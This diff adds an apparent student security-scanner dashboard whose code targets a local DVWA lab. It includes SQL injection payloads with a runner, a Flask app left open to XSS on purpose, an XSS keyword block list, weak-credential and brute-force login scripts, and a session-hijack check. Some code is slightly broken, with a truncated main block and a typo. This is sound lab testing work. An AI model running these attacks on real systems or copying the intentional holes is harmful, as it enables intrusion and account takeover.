@@ -1,0 +1,1056 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>WebScanPro Project Dashboard (Week 1 - Week 7)</title>
+<style>
+body { font-family: Arial, sans-serif; background:#111; color:#fff; margin:0; padding:0;}
+header {background:#0b3d91; padding:20px; text-align:center; font-size:28px; font-weight:bold;}
+.container {padding:20px;}
+.week-section {background:#1a1a1a; padding:20px; margin-bottom:25px; border-radius:8px; border:1px solid #333;}
+button {padding:10px 15px; border:none; margin:5px 0; cursor:pointer; font-weight:bold; border-radius:5px;}
+.file-btn {background:#222; color:#fff; width:100%; text-align:left;}
+.open-btn {background:#0b84ff; color:white; margin-top:10px; width:100%;}
+.code-block {background:#000; color:#0f0; padding:10px; border-radius:4px; font-size:14px; white-space:pre-wrap; display:none;}
+</style>
+<script>
+function toggle(id){
+    var x=document.getElementById(id);
+    x.style.display = (x.style.display === "none") ? "block":"none";
+}
+</script>
+</head>
+<body>
+
+<header>WEBSCANPRO - COMPLETE DASHBOARD (WEEK 1 TO WEEK 7)</header>
+<div class="container">
+<div class="week-section">
+<h2>📍 Week 1 - Environment Setup & Basic Structure</h2>
+
+
+<!-- config.py -->
+<button class="file-btn" onclick="toggle('w1_config')">config.py</button>
+<pre id="w1_config" class="code-block">
+# src/config.py
+TARGET = "http://localhost:8080"
+MAX_PAGES = 200
+CRAWL_DELAY = 1.0
+USER_AGENT = "WebScanProBot/1.0 (+https://example.org)"
+OUTPUT_JSON = "../output/pages_metadata.json"
+OUTPUT_CSV = "../output/pages_metadata.csv"
+</pre>
+
+<!-- utils.py -->
+<button class="file-btn" onclick="toggle('w1_utils')">utils.py</button>
+<pre id="w1_utils" class="code-block">
+# src/utils.py
+import requests
+from bs4 import BeautifulSoup
+import time
+from urllib.parse import urljoin, urlparse
+...
+
+def strip_fragment(url):
+    p = urlparse(url)
+    return p._replace(fragment="").geturl()
+</pre>
+
+<!-- checkfile.py -->
+<button class="file-btn" onclick="toggle('w1_check')">checkfile.py</button>
+<pre id="w1_check" class="code-block">
+import os
+print("\n📂 CSV FILES IN THIS FOLDER:\n")
+for f in os.listdir():
+    if f.lower().endswith(".csv"):
+        print(f)
+</pre>
+
+<!-- index.html -->
+<button class="file-btn" onclick="toggle('w1_index')">index.html</button>
+<pre id="w1_index" class="code-block">
+<!DOCTYPE html>
+<html>
+<head><title>WebScanPro - Week 1</title></head>
+<body>
+<h1>WebScanPro</h1>
+<button id="scanBtn">Run Scan</button>
+</body>
+</html>
+</pre>
+
+<!-- base.html -->
+<button class="file-btn" onclick="toggle('w1_base')">base.html</button>
+<pre id="w1_base" class="code-block">
+<!doctype html>
+<html>
+<head><meta charset="utf-8"></head>
+<body>
+<nav>
+<a href="/">Home</a> | <a href="/stored">Stored XSS</a> | <a href="/reflected">Reflected XSS</a>
+</nav>
+{% block content %}{% endblock %}
+</body>
+</html>
+</pre>
+
+</div>
+<!-- ---------------------------------- WEEK 2 ---------------------------------- -->
+<div class="week-section">
+<h2>📍 Week 2 - Web Crawler & Page Metadata Collection</h2>
+
+<!-- crawler.py -->
+<button class="file-btn" onclick="toggle('w2_crawler')">crawler.py</button>
+<pre id="w2_crawler" class="code-block">
+import requests
+from bs4 import BeautifulSoup            # <-- this is where BeautifulSoup is used to parse HTML
+from urllib.parse import urljoin, urlparse
+import json
+import os
+import time
+
+# -------- CONFIG --------
+START_URL = "http://localhost/dvwa"     # change to your target (dvwa, juice shop etc.)
+MAX_PAGES = 200                         # stop after crawling this many pages (safety)
+OUTPUT_JSON = "./output/pages_metadata.json"
+OUTPUT_LINKS = "./output/links.txt"
+REQUEST_TIMEOUT = 8                     
+SLEEP_BETWEEN_REQUESTS = 0.3
+# ------------------------
+
+visited = set()
+found_links = []
+pages_metadata = []  # list of dicts: {url, title, status_code, forms: [...]}
+
+def sanitize_url(base, href):
+    if not href: return None
+    full = urljoin(base, href)
+    parsed = urlparse(full)
+    cleaned = parsed._replace(fragment="").geturl()
+    return cleaned
+
+def same_domain(url1, url2):
+    p1 = urlparse(url1); p2 = urlparse(url2)
+    return (p1.scheme, p1.hostname) == (p2.scheme, p2.hostname)
+
+def ensure_output_dir(path):
+    directory = os.path.dirname(path)
+    if directory and not os.path.exists(directory):
+        os.makedirs(directory, exist_ok=True)
+
+def save_json(obj, path):
+    ensure_output_dir(path)
+    with open(path, "w", encoding="utf-8") as f:
+        json.dump(obj, f, indent=2, ensure_ascii=False)
+
+def save_links(links, path):
+    ensure_output_dir(path)
+    with open(path, "w", encoding="utf-8") as f:
+        for l in links: f.write(l + "\n")
+
+def extract_inputs_and_forms(soup):
+    forms_info = []
+    for form in soup.find_all("form"):
+        action = form.get("action")
+        method = form.get("method", "get").lower()
+        inputs = []
+        for inp in form.find_all(["input", "textarea", "select"]):
+            name = inp.get("name")
+            typ = inp.get("type") if inp.name == "input" else inp.name
+            value = inp.get("value")
+            inputs.append({"name": name, "type": typ, "value": value})
+        forms_info.append({"action": action, "method": method, "inputs": inputs})
+    return forms_info
+
+def crawl(start_url, max_pages=MAX_PAGES):
+    to_visit = [start_url]
+
+    while to_visit and len(visited) < max_pages:
+        url = to_visit.pop(0)
+        if url in visited: continue
+        print(f"[+] Fetching: {url}")
+        try:
+            resp = requests.get(url, timeout=REQUEST_TIMEOUT)
+        except requests.RequestException as e:
+            print(f"    ! Request failed: {e}")
+            visited.add(url)
+            pages_metadata.append({"url": url,"status": "error","error": str(e),"forms": []})
+            continue
+
+        visited.add(url)
+        status = resp.status_code
+        text = resp.text if resp.text else ""
+        soup = BeautifulSoup(text, "html.parser")
+
+        title_tag = soup.find("title")
+        title = title_tag.get_text().strip() if title_tag else ""
+        forms = extract_inputs_and_forms(soup)
+
+        pages_metadata.append({"url": url,"status": status,"title": title,"forms": forms})
+
+        for a in soup.find_all("a", href=True):
+            href = a.get("href")
+            full = sanitize_url(url, href)
+            if not full: continue
+            if full.startswith("mailto:") or full.startswith("javascript:"): continue
+            if same_domain(start_url, full):
+                if full not in visited and full not in to_visit:
+                    to_visit.append(full)
+                    found_links.append(full)
+
+        time.sleep(SLEEP_BETWEEN_REQUESTS)
+
+    print(f"\nCrawled {len(visited)} pages.")
+    return pages_metadata, found_links
+
+if __name__ == "__main__":
+    print("Starting crawler...")
+    pages, links = crawl(START_URL)
+    save_json(pages, OUTPUT_JSON)
+    save_links(sorted(set(links)), OUTPUT_LINKS)
+    print(f"Saved pages metadata to {OUTPUT_JSON}")
+    print(f"Saved links to {OUTPUT_LINKS}")
+</pre>
+
+
+<!-- Selenium Alternative Fetch -->
+<button class="file-btn" onclick="toggle('w2_selenium')">selenium_fetch.py</button>
+<pre id="w2_selenium" class="code-block">
+from selenium import webdriver
+from selenium.webdriver.chrome.options import Options
+
+def fetch_with_selenium(url, driver_path="chromedriver"):
+    opts = Options()
+    opts.add_argument("--headless")
+    driver = webdriver.Chrome(executable_path=driver_path, options=opts)
+    try:
+        driver.get(url)
+        html = driver.page_source
+        status = 200
+        return status, html
+    except Exception as e:
+        print(f"[selenium fetch] error: {e}")
+        return None, None
+    finally:
+        driver.quit()
+</pre>
+
+</div>
+<!-- ---------------------------------- WEEK 3 ---------------------------------- -->
+<div class="week-section">
+<h2>📍 Week 3 - SQL Injection Automation Engine</h2>
+<p>In Week 3, we automated SQL Injection testing using CSV targets, payloads, and a Python engine to detect DB errors.</p>
+
+<!-- targets.csv -->
+<button class="file-btn" onclick="toggle('w3_targets')">targets.csv</button>
+<pre id="w3_targets" class="code-block">
+url,method,param,benign_value,headers
+http://localhost/DVWA/vulnerabilities/sqli/?id=1,GET,id,1,"{'User-Agent':'webscanpro/1.0'}"
+http://localhost/DVWA/vulnerabilities/sqli/?id=1,POST,submit,Submit,"{'User-Agent':'webscanpro/1.0'}"
+</pre>
+
+<!-- payloads.txt -->
+<button class="file-btn" onclick="toggle('w3_payloads')">payloads.txt</button>
+<pre id="w3_payloads" class="code-block">
+' OR '1'='1
+' OR '1'='1' --
+' UNION SELECT NULL --
+' AND 1=CAST((SELECT TOP 1 name FROM users) AS INT) --
+' AND SLEEP(3) --
+" OR "a"="a
+</pre>
+
+<!-- sqli_runner.py -->
+<button class="file-btn" onclick="toggle('w3_sqli_runner')">sqli_runner.py</button>
+<pre id="w3_sqli_runner" class="code-block">
+"""
+Run SQL payloads against targets.csv and write sqli_runs_raw.csv
+Outputs columns:
+run_id,url,method,param,payload,status_code,resp_len,resp_time,sql_error_flag,resp_snippet
+"""
+import csv, time, json, uuid, requests
+from urllib.parse import urlsplit, urlunsplit, parse_qs, urlencode
+from tqdm import tqdm
+
+TARGETS_CSV = 'targets.csv'
+PAYLOADS_TXT = 'payloads.txt'
+OUT_CSV = 'sqli_runs_raw.csv'
+SQL_ERROR_KEYWORDS = ['syntax error','mysql','sql','pg_','sqlstate','error in your sql syntax']
+
+def load_targets(path):
+    rows = []
+    with open(path, newline='') as f:
+        for r in csv.DictReader(f):
+            try: hdrs = json.loads(r['headers'].replace("'", '"'))
+            except: hdrs = {}
+            rows.append({'url': r['url'], 'method': r['method'].upper(),
+                         'param': r['param'], 'benign_value': r['benign_value'],
+                         'headers': hdrs})
+    return rows
+
+def load_payloads(path):
+    return [p.strip() for p in open(path).read().splitlines() if p.strip()]
+
+def run_one(target, payload):
+    url, method, param, headers = target['url'], target['method'], target['param'], target['headers']
+    if method == 'GET':
+        parsed = urlsplit(url); qs = parse_qs(parsed.query)
+        qs[param] = payload; new_qs = urlencode(qs, doseq=True)
+        test_url = urlunsplit((parsed.scheme, parsed.netloc, parsed.path, new_qs, parsed.fragment))
+        start = time.time(); resp = requests.get(test_url, headers=headers, timeout=10)
+    else:
+        data = {param: payload}
+        start = time.time(); resp = requests.post(url, data=data, headers=headers, timeout=10)
+
+    text = resp.text.lower() if resp.text else ''
+    return resp.status_code, len(text), (time.time()-start), any(x in text for x in SQL_ERROR_KEYWORDS), text[:500]
+
+def main():
+    targets = load_targets(TARGETS_CSV)
+    payloads = load_payloads(PAYLOADS_TXT)
+
+    with open(OUT_CSV, 'w', newline='', encoding='utf-8') as out:
+        writer = csv.writer(out)
+        writer.writerow(['run_id','url','method','param','payload','status','resp_len','resp_time','sql_error_flag','resp_snippet'])
+        for t in tqdm(targets, desc='Targets'):
+            for p in payloads:
+                try:
+                    status, rlen, rtime, sql_err, snippet = run_one(t, p)
+                except Exception as e:
+                    status, rlen, rtime, sql_err, snippet = -1,0,0,False,str(e)
+                writer.writerow([str(uuid.uuid4()), t['url'],t['method'],t['param'],p,status,rlen,rtime,int(sql_err),snippet])
+
+if __name__ == '__main__':
+    main()
+</pre>
+
+<!-- Output Example -->
+<button class="file-btn" onclick="toggle('w3_output')">sqli_runs_raw.csv (sample output)</button>
+<pre id="w3_output" class="code-block">
+run_id,url,method,param,payload,status,resp_len,resp_time,sql_error_flag
+b29e78a2-4632-4133-850f,GET,id,' OR '1'='1,200,634,2.5,1
+a41326a7-f0b6-49ba-82ee,GET,id,' UNION SELECT NULL --,200,634,2.0,1
+f83d39a4-73a8-4f5b-8f6a47,GET,id,' AND SLEEP(3) --,200,634,2.0,1
+</pre>
+
+</div>
+<!-- ---------------------------------- WEEK 4 ---------------------------------- -->
+<div class="week-section">
+<h2>🔐 Week 4 - Authentication & Session Security Testing</h2>
+<p>Week 4 focuses on weak login detection, session misuse, brute-force attempts, and anomaly detection using ML.</p>
+<!-- app.py -->
+<button class="file-btn" onclick="toggle('w4_app')">app.py</button>
+<pre id="w4_app" class="code-block">
+import os
+import joblib
+import re
+from flask import Flask, render_template, request, redirect, url_for, flash
+
+# ---------- Project paths ----------
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+TEMPLATES_DIR = os.path.join(BASE_DIR, "templates")
+STATIC_DIR = os.path.join(BASE_DIR, "static")
+STATIC_CSS_DIR = os.path.join(STATIC_DIR, "css")
+MODEL_PATH = os.path.join(BASE_DIR, "models", "xss_detector.joblib")
+
+# ---------- Ensure folders and minimal files exist ----------
+os.makedirs(TEMPLATES_DIR, exist_ok=True)
+os.makedirs(STATIC_CSS_DIR, exist_ok=True)
+os.makedirs(os.path.join(BASE_DIR, "models"), exist_ok=True)  # models folder exists even if empty
+
+# Create a minimal base.html if missing
+base_html_path = os.path.join(TEMPLATES_DIR, "base.html")
+if not os.path.exists(base_html_path):
+    with open(base_html_path, "w", encoding="utf-8") as f:
+        f.write("""<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>XSS + ML Demo</title>
+  <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
+</head>
+<body>
+  <nav>
+    <a href="{{ url_for('index') }}">Home</a> |
+    <a href="{{ url_for('stored_xss') }}">Stored XSS</a> |
+    <a href="{{ url_for('reflected_xss') }}">Reflected XSS</a>
+  </nav>
+
+  <div class="flash">
+    {% with messages = get_flashed_messages(with_categories=true) %}
+      {% if messages %}
+        <ul>
+        {% for category, msg in messages %}
+          <li class="{{ category }}">{{ msg }}</li>
+        {% endfor %}
+        </ul>
+      {% endif %}
+    {% endwith %}
+  </div>
+
+  <div class="content">
+    {% block content %}{% endblock %}
+  </div>
+</body>
+</html>
+""")
+
+# Create index.html if missing
+index_html_path = os.path.join(TEMPLATES_DIR, "index.html")
+if not os.path.exists(index_html_path):
+    with open(index_html_path, "w", encoding="utf-8") as f:
+        f.write("""{% extends "base.html" %}
+{% block content %}
+  <h1>XSS Lab + ML</h1>
+  <p>Quick demo: try Stored and Reflected pages.</p>
+{% endblock %}""")
+
+# Create stored.html if missing
+stored_html_path = os.path.join(TEMPLATES_DIR, "stored.html")
+if not os.path.exists(stored_html_path):
+    with open(stored_html_path, "w", encoding="utf-8") as f:
+        f.write("""{% extends "base.html" %}
+{% block content %}
+<h2>Stored XSS Demo</h2>
+<form method="post">
+  Name:<br>
+  <input type="text" name="name" /><br><br>
+  Message:<br>
+  <textarea name="message" rows="4" cols="50"></textarea><br><br>
+  <button type="submit">Post</button>
+</form>
+
+<hr>
+<h3>Posts</h3>
+{% for p in messages %}
+  <div class="post">
+    <strong>{{ p.name|safe }}</strong>: <span>{{ p.message|safe }}</span>
+  </div>
+{% else %}
+  <p>No posts yet.</p>
+{% endfor %}
+{% endblock %}""")
+
+# Create reflected.html if missing
+reflected_html_path = os.path.join(TEMPLATES_DIR, "reflected.html")
+if not os.path.exists(reflected_html_path):
+    with open(reflected_html_path, "w", encoding="utf-8") as f:
+        f.write("""{% extends "base.html" %}
+{% block content %}
+<h2>Reflected XSS Demo</h2>
+<form method="post">
+  Query: <input type="text" name="q" />
+  <button type="submit">Search</button>
+</form>
+
+<hr>
+{% if q %}
+  <p>Result: {{ q|safe }}</p>
+{% endif %}
+{% endblock %}""")
+
+# Create a minimal CSS if missing
+css_path = os.path.join(STATIC_CSS_DIR, "style.css")
+if not os.path.exists(css_path):
+    with open(css_path, "w", encoding="utf-8") as f:
+        f.write("""body { font-family: Arial, sans-serif; margin: 20px; }
+nav { margin-bottom: 15px; }
+.flash ul { list-style: none; padding: 0; }
+.flash li.success { color: green; }
+.flash li.danger { color: red; }
+.post { border: 1px solid #ddd; padding: 8px; margin-bottom: 6px; border-radius: 4px; }""")
+
+# ---------- Create the Flask app with explicit template/static folders ----------
+app = Flask(__name__, template_folder=TEMPLATES_DIR, static_folder=STATIC_DIR)
+app.secret_key = 'dev-secret-key'  # change in production
+
+# ---------- Debug prints so you can see what the app is using ----------
+print("APP BASE DIR         :", BASE_DIR)
+print("TEMPLATES DIR        :", TEMPLATES_DIR)
+print("STATIC DIR           :", STATIC_DIR)
+print("STATIC CSS DIR       :", STATIC_CSS_DIR)
+print("MODEL PATH           :", MODEL_PATH)
+try:
+    print("Templates listing     :", os.listdir(TEMPLATES_DIR))
+except Exception as e:
+    print("Cannot list templates:", e)
+
+# ---------- ML model loader (tries to load joblib model) ----------
+model = None
+vectorizer = None
+if os.path.exists(MODEL_PATH):
+    try:
+        data = joblib.load(MODEL_PATH)
+        model = data.get("model")
+        vectorizer = data.get("vectorizer")
+        print("Loaded ML model from:", MODEL_PATH)
+    except Exception as e:
+        print("Failed loading ML model:", e)
+
+# ---------- Fallback heuristic detector (simple rule-based) ----------
+SUSPICIOUS_TOKENS = [
+    "<script", "onerror", "onload", "javascript:", "<img", "<svg", "<iframe", "alert(", "<body", "document.cookie"
+]
+def is_suspicious_heuristic(text: str) -> bool:
+    if not text:
+        return False
+    t = text.lower()
+    for tok in SUSPICIOUS_TOKENS:
+        if tok in t:
+            return True
+    special_chars = sum(1 for ch in t if ch in "<>\"'")
+    if special_chars >= 4:
+        return True
+    if re.search(r"<\s*script\b|on\w+\s*=|javascript\s*:", t):
+        return True
+    return False
+
+def ml_score(text: str):
+    """Return score 0..1 if ML available, else None."""
+    if model is None or vectorizer is None:
+        return None
+    try:
+        X = vectorizer.transform([text])
+        return float(model.predict_proba(X)[0,1])
+    except Exception as e:
+        print("ML scoring error:", e)
+        return None
+
+# ---------- In-memory storage (demo only) ----------
+stored_messages = []
+
+# ---------- Routes ----------
+@app.route('/')
+def index():
+    return render_template('index.html')
+
+@app.route('/stored', methods=['GET', 'POST'])
+def stored_xss():
+    if request.method == 'POST':
+        name = request.form.get('name', '')
+        message = request.form.get('message', '')
+        combined = (name + ' ' + message).strip()
+
+        # 1) Try ML model if available
+        score = ml_score(combined)
+        if score is not None:
+            threshold = 0.5
+            if score >= threshold:
+                flash(f"Input blocked by ML (suspicious score={score:.2f})", 'danger')
+                return redirect(url_for('stored_xss'))
+
+        # 2) If ML not available, use heuristic detector
+        else:
+            if is_suspicious_heuristic(combined):
+                flash("Input blocked by heuristic detector (likely XSS).", "danger")
+                return redirect(url_for('stored_xss'))
+
+        # Save (vulnerable demonstration; templates use |safe intentionally)
+        stored_messages.append({'name': name, 'message': message})
+        flash('Posted successfully.', 'success')
+        return redirect(url_for('stored_xss'))
+
+    return render_template('stored.html', messages=stored_messages)
+
+@app.route('/reflected', methods=['GET', 'POST'])
+def reflected_xss():
+    q = None
+    if request.method == 'POST':
+        q = request.form.get('q', '')
+
+        score = ml_score(q)
+        if score is not None:
+            if score >= 0.5:
+                flash(f"Input blocked by ML (suspicious score={score:.2f})", 'danger')
+                return redirect(url_for('reflected_xss'))
+        else:
+            if is_suspicious_heuristic(q):
+                flash("Input blocked by heuristic detector (likely XSS).", "danger")
+                return redirect(url_for('reflected_xss'))
+
+    return render_template('reflected.html', q=q)
+
+# Simple plain route for testing without templates
+@app.route('/plain')
+def plain():
+    return "<h1>Plain route OK</h1>"
+
+# ---------- Run ----------
+if __name__ == '__main__':
+
+</pre>
+
+<!-- 📁 auth_attack.py -->
+<button class="file-btn" onclick="toggle('w4_authattack')">auth_attack.py</button>
+<pre id="w4_authattack" class="code-block">
+import requests
+import time
+
+url = "http://localhost/dvwa/login.php"
+username = "admin"
+passwords = ["wrong1","wrong2","wrong3","wrong4","password"]
+
+for pwd in passwords:
+    r = requests.post(url, data={
+        "username": username,
+        "password": pwd,
+        "Login": "Login"
+    })
+    print(f"Tried password: {pwd}")
+    time.sleep(1)
+</pre>
+
+<!-- 📁 weak_creds_check.py -->
+<button class="file-btn" onclick="toggle('w4_weakcreds')">weak_creds_check.py</button>
+<pre id="w4_weakcreds" class="code-block">
+import requests
+
+url = "http://localhost/dvwa/login.php"
+credentials = [
+    ("admin","admin"),
+    ("admin","password"),
+    ("admin","123456"),
+    ("test","test"),
+    ("root","root")
+]
+
+for username, password in credentials:
+    res = requests.post(url, data={"username":username,"password":password,"Login":"Login"})
+    if "Welcome" in res.text:
+        print(f"[+] WEAK LOGIN SUCCESS: {username}:{password}")
+    else:
+        print(f"[-] Failed: {username}:{password}")
+</pre>
+
+<!-- 📁 session_analysis.py -->
+<button class="file-btn" onclick="toggle('w4_session')">session_analysis.py</button>
+<pre id="w4_session" class="code-block">
+import requests
+
+cookies = {"PHPSESSID":"STEAL_THIS_FROM_BROWSER"}  # capture from browser devtools
+
+r = requests.get("http://localhost/dvwa/", cookies=cookies)
+if "Welcome" in r.text:
+    print("[+] SESSION HIJACKING POSSIBLE (VALID WITHOUT LOGIN)")
+else:
+    print("[-] Session rejected (secure)")
+</pre>
+
+<!-- 📁 anomaly_detection.py -->
+<button class="file-btn" onclick="toggle('w4_anomaly')">anomaly_detection.py</button>
+<pre id="w4_anomaly" class="code-block">
+import pandas as pd
+from sklearn.ensemble import IsolationForest
+
+data = pd.read_csv("logs/authlogs.csv")
+
+model = IsolationForest(contamination=0.2)
+data["anomaly"] = model.fit_predict(data[["attempts","response_time"]])
+
+print(data[data["anomaly"] == -1])  # flagged anomalies
+</pre>
+
+<!-- 📁 Sample Logs -->
+<button class="file-btn" onclick="toggle('w4_logs')">authlogs.csv (sample)</button>
+<pre id="w4_logs" class="code-block">
+attempts,response_time
+1,0.4
+2,0.8
+4,1.6
+10,5.2   <-- anomaly
+12,6.9   <-- anomaly
+</pre>
+
+</div>
+<!-- ---------------------------------- WEEK 5 ---------------------------------- -->
+<div class="week-section">
+<h2>🛡️ Week 5 - Session Management + IDOR + ML Anomaly Review</h2>
+<p>In Week 5, we focused on session security, cookie protection, broken authentication checks, 
+and IDOR endpoint traversal to detect horizontal privilege access.</p>
+
+<!-- anamolydetection.py -->
+<button class="file-btn" onclick="toggle('w5_session_token')">anamolydetection.py</button>
+<pre id="w5_session_token" class="code-block">
+import pandas as pd
+from sklearn.ensemble import IsolationForest
+
+data = pd.read_csv("logs/authlogs.csv")
+
+model = IsolationForest(contamination=0.2)
+data["anomaly"] = model.fit_predict(data[["attempts", "response_time"]])
+
+print(data[data["anomaly"] == -1])
+</pre>
+
+<!-- sessionanalysis.py -->
+<button class="file-btn" onclick="toggle('w5_cookie_check')">sessionanalysis.py</button>
+<pre id="w5_cookie_check" class="code-block">
+iimport requests
+
+session = requests.Session()
+
+login = session.post("http://localhost/dvwa/login.php", data={
+    "username": "admin",
+    "password": "password",
+    "Login": "Login"
+})
+
+for cookie in session.cookies:
+    print("Cookie Name:", cookie.name)
+    print("Value:", cookie.value)
+    print("Secure:", cookie.secure)
+    print("HttpOnly:", cookie.has_nonstandard_attr("HttpOnly"))
+    print("-" * 30)
+</pre>
+
+<!-- sessionhijack.py -->
+<button class="file-btn" onclick="toggle('w5_idor')">sessionhijack.py</button>
+<pre id="w5_idor" class="code-block">
+import requests
+
+cookies = {
+    "PHPSESSID": "STEAL_THIS_FROM_BROWSER"
+}
+
+r = requests.get("http://localhost/dvwa/", cookies=cookies)
+
+if "Welcome" in r.text:
+    print("[+] SESSION HIJACKING POSSIBLE")
+else:
+    print("[-] Session rejected")
+</pre>
+
+<!-- weeklogin.py -->
+<button class="file-btn" onclick="toggle('w5_ml')">weeklogin.py</button>
+<pre id="w5_ml" class="code-block">
+import requests
+
+url = "http://localhost/dvwa/login.php"
+
+credentials = [
+    ("admin", "admin"),
+    ("admin", "password"),
+    ("admin", "123456"),
+    ("test", "test"),
+    ("root", "root")
+]
+
+for username, password in credentials:
+    response = requests.post(url, data={
+        "username": username,
+        "password": password,
+        "Login": "Login"
+    })
+
+    if "Welcome" in response.text:
+        print(f"[+] WEAK LOGIN SUCCESS: {username}:{password}")
+    else:
+        print(f"[-] Failed: {username}:{password}")
+</pre>
+
+<!--Output -->
+<button class="file-btn" onclick="toggle('w5_output')">📄Output</button>
+<pre id="w5_output" class="code-block">
+ attempts  response_time  anomaly
+4        15           0.05       -1
+</pre>
+
+</div>
+<!-- ---------------------------------- WEEK 6 ---------------------------------- -->
+<div class="week-section">
+<h2>🧩 Week 6 - Business Logic, Privilege Escalation & Access Control Testing</h2>
+<p>Week 6 expanded into IDOR escalation, business logic abuse, and session lifecycle flaws.</p>
+
+<!-- session_manager.py -->
+<button class="file-btn" onclick="toggle('w6_logic')">session_manager.py</button>
+<pre id="w6_logic" class="code-block">
+import requests
+from config import LOGIN_URL
+def login(username, password):
+    """
+    Logs in to the application and returns a session object
+    """
+    session = requests.Session()
+
+    payload = {
+        "username": username,
+        "password": password,
+        "Login": "Login"
+    }
+
+    response = session.post(LOGIN_URL, data=payload)
+
+    if response.status_code == 200:
+        print(f"[+] Logged in as {username}")
+        return session
+    else:
+        print(f"[-] Login failed for {username}")
+        return None
+</pre>
+
+<!-- idor_tester.py -->
+<button class="file-btn" onclick="toggle('w6_idor_priv')">idor_tester.py</button>
+<pre id="w6_idor_priv" class="code-block">
+from anomaly_detector import analyze_responses
+from logger import log_issue
+
+def test_idor(user_session, admin_session):
+    print("\n[+] Starting AI-assisted IDOR testing")
+
+    url = "http://localhost/dvwa/vulnerabilities/sqli/"
+
+    for user_id in range(1, 6):
+        params = {"id": user_id, "Submit": "Submit"}
+
+        # Authorized access (admin)
+        auth_response = admin_session.get(url, params=params)
+
+        # Unauthorized access (user)
+        unauth_response = user_session.get(url, params=params)
+
+        vulnerable = analyze_responses(auth_response, unauth_response)
+
+        if vulnerable:
+            log_issue(
+                issue_type="IDOR",
+                endpoint=f"{url}?id={user_id}",
+                description="Unauthorized user accessed another user's data"
+            )
+        else:
+            print(f"[+] No IDOR detected for user_id={user_id}")
+
+</pre>
+
+<!-- access_control_tester.py -->
+<button class="file-btn" onclick="toggle('w6_session')">access_control_tester.py</button>
+<pre id="w6_session" class="code-block">
+from anomaly_detector import analyze_responses
+from logger import log_issue
+
+def test_access_control(user_session, admin_session):
+    print("\n[+] Starting AI-assisted access control testing")
+
+    admin_pages = [
+        "http://localhost/dvwa/security.php",
+        "http://localhost/dvwa/setup.php"
+    ]
+
+    for page in admin_pages:
+        auth_response = admin_session.get(page)
+        unauth_response = user_session.get(page)
+
+        vulnerable = analyze_responses(auth_response, unauth_response)
+
+        if vulnerable:
+            log_issue(
+                issue_type="Vertical Privilege Escalation",
+                endpoint=page,
+                description="Low-privileged user accessed admin-only resource"
+            )
+        else:
+            print(f"[+] Access control enforced correctly for {page}")
+
+</pre>
+
+<!-- role_checker.py -->
+<button class="file-btn" onclick="toggle('w6_privilege')">role_checker.py</button>
+<pre id="w6_privilege" class="code-block">
+def check_role(session, role_name):
+    test_url = "http://localhost/dvwa/security.php"
+    response = session.get(test_url)
+
+    if response.status_code == 200:
+        print(f"[+] {role_name} can access security page")
+    else:
+        print(f"[-] {role_name} cannot access security page")
+
+</pre>
+
+<!--output -->
+<button class="file-btn" onclick="toggle('w6_output')">📄Output</button>
+<pre id="w6_output" class="code-block">
+[🚨]  Starting AI-assisted IDOR testing
+[2025-12-25 15:46:11] IDOR | Endpoint: http://localhost/dvwa/vulnerabilities/sqli/?id=1 | Severity: High | Unauthorized user accessed another user's data
+[2025-12-25 15:46:11] IDOR | Endpoint: http://localhost/dvwa/vulnerabilities/sqli/?id=2 | Severity: High | Unauthorized user accessed another user's data
+[2025-12-25 15:46:11] IDOR | Endpoint: http://localhost/dvwa/vulnerabilities/sqli/?id=3 | Severity: High | Unauthorized user accessed another user's data
+[2025-12-25 15:46:11] IDOR | Endpoint: http://localhost/dvwa/vulnerabilities/sqli/?id=4 | Severity: High | Unauthorized user accessed another user's data
+[2025-12-25 15:46:11] IDOR | Endpoint: http://localhost/dvwa/vulnerabilities/sqli/?id=5 | Severity: High | Unauthorized user accessed another user's data
+
+[+] Starting AI-assisted access control testing
+[2025-12-25 15:46:11] Vertical Privilege Escalation | Endpoint: http://localhost/dvwa/security.php | Severity: High | Low-privileged user accessed admin-only resource
+</pre>
+
+</div>
+<!-- ---------------------------------- WEEK 7 ---------------------------------- -->
+<div class="week-section">
+<h2>🤖 Week 7 - AI Driven Vulnerability Report Generation</h2>
+<p>Week 7 combines all previous module outputs (SQLi, XSS, Auth, IDOR) and generates a final AI report with severity scoring and remediation.</p>
+
+<!-- week7report.py -->
+<button class="file-btn" onclick="toggle('w7_report_script')">week7report.py</button>
+<pre id="w7_report_script" class="code-block">
+import pandas as pd
+import os
+import matplotlib.pyplot as plt
+import tkinter as tk
+from tkinter import messagebox
+
+print("\\n=== WEEK 7: FULL AI DRIVEN SECURITY REPORT SYSTEM STARTED ===\\n")
+
+# -------------------------------------------------
+# 1️⃣ Auto-load SQLi CSV (from week 3)
+# -------------------------------------------------
+possible_files = [
+    "sqli_unsupervised_scores.csv",
+    "sqli_runs_raw.csv",
+    "sqli_runs_features.csv",
+    "sqli_runs_features_auto_labeled.csv"
+]
+
+sqli_file = None
+for f in possible_files:
+    if os.path.exists(f):
+        sqli_file = f
+        break
+
+if not sqli_file:
+    print("❌ ERROR: No SQLi CSV found.")
+    exit()
+
+sqli = pd.read_csv(sqli_file)
+sqli["vulnerability"] = "SQL Injection"
+print(f"✔ Loaded: {sqli_file}")
+
+# -------------------------------------------------
+# 2️⃣ Load XSS Targets (Week 4)
+# -------------------------------------------------
+if os.path.exists("targets.csv"):
+    xss = pd.read_csv("targets.csv", header=None, names=["endpoint"])
+    xss["payload"] = "XSS test payload"
+    xss["vulnerability"] = "XSS"
+    print("✔ XSS targets loaded")
+else:
+    xss = pd.DataFrame(columns=["endpoint","payload","vulnerability"])
+    print("⚠ No XSS CSV found")
+
+# -------------------------------------------------
+# 3️⃣ Manual Authentication + IDOR Findings (Week 4-6)
+# -------------------------------------------------
+auth = pd.DataFrame([
+    {"endpoint": "/login", "payload":"Weak session token", "vulnerability":"Authentication Issue"},
+    {"endpoint": "/admin", "payload":"No MFA or expiration", "vulnerability":"Authentication Issue"},
+])
+
+idor = pd.DataFrame([
+    {"endpoint": "/user/3", "payload":"Unauthorized access", "vulnerability":"IDOR"},
+    {"endpoint": "/profile/4", "payload":"Privilege escalation to user data", "vulnerability":"IDOR"},
+])
+
+# -------------------------------------------------
+# 4️⃣ Combine All Results
+# -------------------------------------------------
+data = pd.concat([sqli, xss, auth, idor], ignore_index=True)
+
+# -------------------------------------------------
+# 5️⃣ Severity Assignment
+# -------------------------------------------------
